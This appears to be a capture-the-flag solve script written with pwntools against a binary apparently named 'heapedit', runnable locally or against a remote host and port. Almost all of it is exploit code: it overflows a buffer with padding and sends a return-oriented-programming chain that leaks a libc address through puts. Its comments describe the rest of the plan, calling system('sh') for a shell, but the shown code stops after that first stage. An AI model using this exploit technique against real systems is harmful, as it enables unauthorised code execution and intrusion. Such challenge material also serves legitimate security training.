#!/usr/bin/env python3

import os
import shutil
import sys

from pwn import *


def usage(err=None):
    if err is not None:
        log.failure(f"error: {err}")
    log.failure("usage: one of\n")
    log.failure("  solve.py local <vuln> <ld.so> <libc>")
    log.failure("  solve.py remote <host:str> <port:int>\n")
    sys.exit(0 if err is None else -1)


def setup():
    if sys.argv[1] == 'local':
        if len(sys.argv) != 5:
            usage("wrong number of arguments")
        if any(not os.path.isfile(f) for f in sys.argv[2:]):
            usage("invalid filepath provided")
        local = True
        heapedit, ldso, libc = sys.argv[2:]
    elif sys.argv[1] == 'remote':
        if len(sys.argv) != 4:
            usage("wrong number of arguments")
        local = False
        host, port = sys.argv[2:]
        try:
            port = int(port)
        except ValueError:
            usage("port must be an int")
    else:
        usage(f"unknown connection type: {sys.argv[1]}")

    if local:
        with tempfile.TemporaryDirectory() as wd:
            tmp_exe = os.path.join(wd, 'exe')
            shutil.copy(heapedit, tmp_exe)
            shutil.copy(ldso, wd)
            shutil.copy(libc, wd)

            with process([tmp_exe], cwd=wd) as tube:
                # tube.sendline(b'r')
                solve(tube)
    else:
        with remote(host, port) as tube:
            solve(tube)


def mkrop(data, rop):
    INIT_PAD = 100  # first pad to get past case mangling
    ROP_PAD = 0x88  # second pad to get to ROP address
    data = b'\0'.join(data)
    # assert our data fits into the space available
    assert len(data) < ROP_PAD - INIT_PAD
    payload = INIT_PAD * b'a'
    payload += data
    payload += (ROP_PAD - len(payload)) * b'b'
    payload += b''.join(a.to_bytes(8, 'little') for a in rop)
    payload += b'rop end!'  # marker for the end
    return payload


def solve(cxn):
    # This challenge doesn't directly have a flag, it just pops a shell, so
    # there isn't really a way to check 'expected flag'. We just throw and
    # go interactive.

    # Strategy for this ROP is to call system("sh"), because it's easier to
    # ROP in one argument than several. Then we don't care about system status
    # so don't bother ROPing to `exit`.

    # To do that we'll have to first ROP a bit to leak a function in libc's
    # address, then calculate the offset to `system`, then load the argument
    # and call it.

    payload1 = mkrop([], [
        # 0x00400913: pop rdi; ret;
        0x00400913,
        # the actual value of rdi we want: the pointer to puts itself
        0x00601018,
        # return into calling puts
        0x00400769,
        # then to _start
        0x00400590,
    ])

    log.info(f"Sending payload 1: {payload1}")
    cxn.sendline(payload1)
    cxn.interactive()


if __name__ == '__main__':
    setup()
